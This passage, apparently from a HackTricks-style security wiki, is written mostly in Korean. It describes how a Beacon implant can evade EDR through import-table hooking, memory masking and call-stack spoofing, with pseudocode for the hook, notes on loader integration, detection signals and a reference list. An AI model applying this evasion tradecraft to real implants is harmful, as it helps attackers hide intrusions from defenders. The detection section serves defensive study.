- 각 PIC wrapper는 실제 API 주소로 tail‑call하기 전에 회피를 수행합니다. 일반적인 회피 기법은 다음과 같습니다:
  - 호출 전후로 메모리 마스크/언마스킹(예: encrypt beacon regions, RWX→RX, change page names/permissions) 후 호출 뒤에 복원.
  - Call‑stack spoofing: 정상적인 스택을 구성하고 대상 API로 전환해 call‑stack 분석에서 예상 프레임으로 해석되도록 합니다.
- 호환성을 위해 인터페이스를 export하여 Aggressor script(또는 동등한 것)가 Beacon, BOFs 및 post‑ex DLLs에 대해 후킹할 API를 등록할 수 있도록 합니다.

Why IAT hooking here
- 후킹된 import를 사용하는 모든 코드에서 동작하므로 도구 코드를 수정하거나 Beacon에 특정 API 프록시를 의존할 필요가 없습니다.
- post‑ex DLLs를 포괄: LoadLibrary*를 후킹하면 모듈 로드(예: System.Management.Automation.dll, clr.dll)를 가로채 동일한 마스킹/스택 회피를 해당 API 호출에 적용할 수 있습니다.
- CreateProcessA/W를 래핑함으로써 call‑stack‑기반 탐지에 대해 프로세스 생성형 post‑ex 명령의 신뢰성 있는 사용을 복원합니다.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
참고
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- 래퍼는 작고 PIC-safe하게 유지하세요; 패치 전에 캡처한 원래 IAT 값이나 LdrGetProcedureAddress를 통해 실제 API를 해결하세요.
- PIC에는 RW → RX 전환을 사용하고 writable+executable 페이지를 남기지 마세요.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- 이 방법은 Beacon/BOFs에서 민감한 API로의 정형화된 스택을 기대하는 탐지를 무력화합니다.
- API prologue 이전에 예상된 프레임 내부에 도달하도록 stack cutting/stack stitching 기법과 함께 사용하세요.

운영 통합
- post‑ex DLLs의 앞에 reflective loader를 추가하여 DLL이 로드될 때 PIC와 훅이 자동으로 초기화되게 하세요.
- Aggressor 스크립트를 사용해 대상 API를 등록하면 Beacon과 BOFs가 코드 변경 없이 동일한 회피 경로의 이득을 투명하게 받을 수 있습니다.

탐지/DFIR 고려사항
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- 스택 이상: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- 로더 텔레메트리: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- 이미지 로드 회피: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

관련 구성 블록 및 예시
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## 참고자료

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
